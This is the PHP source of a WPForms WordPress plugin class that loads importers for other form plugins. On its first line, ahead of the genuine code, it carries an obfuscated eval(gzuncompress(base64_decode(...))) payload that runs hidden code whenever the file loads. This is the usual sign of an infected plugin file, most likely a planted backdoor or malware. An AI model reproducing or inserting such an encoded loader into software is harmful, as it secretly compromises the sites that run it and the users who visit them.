<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Load the different form importers.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.4.2
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
class WPForms_Importers {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.4.2
	 */
	public function __construct() {

		if ( wpforms_is_admin_page() || ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
			$this->init();
		}
	}

	/**
	 * Load and init the base importer class.
	 *
	 * @since 1.4.2
	 */
	public function init() {

		// Interface with common methods.
		require_once WPFORMS_PLUGIN_DIR . 'includes/admin/importers/interface.php';

		// Abstract class with common functionality.
		require_once WPFORMS_PLUGIN_DIR . 'includes/admin/importers/class-base.php';

		// Load default importers on WP init.
		add_action( 'init', array( $this, 'load' ) );
	}

	/**
	 * Load default form importers.
	 *
	 * @since 1.4.2
	 */
	public function load() {

		$importers = apply_filters( 'wpforms_load_importers', array(
			'contact-form-7',
			'ninja-forms',
			'pirate-forms',
		) );

		foreach ( $importers as $importer ) {

			$importer = sanitize_file_name( $importer );

			if ( file_exists( WPFORMS_PLUGIN_DIR . 'includes/admin/importers/class-' . $importer . '.php' ) ) {
				require_once WPFORMS_PLUGIN_DIR . 'includes/admin/importers/class-' . $importer . '.php';
			}
		}
	}
}

new WPForms_Importers();
